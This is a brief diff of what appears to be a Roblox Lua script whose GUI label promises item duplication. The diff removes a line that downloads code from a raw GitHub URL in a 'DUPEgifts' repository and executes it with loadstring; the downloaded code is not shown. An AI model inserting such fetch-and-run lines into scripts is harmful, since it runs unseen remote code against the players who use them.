@@ -49,5 +49,3 @@ _30Minutes.Text = "Click Duplicate to duplicate, then wait a while. This doesn't
 "
 _30Minutes.TextColor3 = Color3.fromRGB(255, 255, 255)
 _30Minutes.TextSize = 23.000
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/mikoks21/DUPEgifts/main/ExclusiveHugeGistEgg", true))()
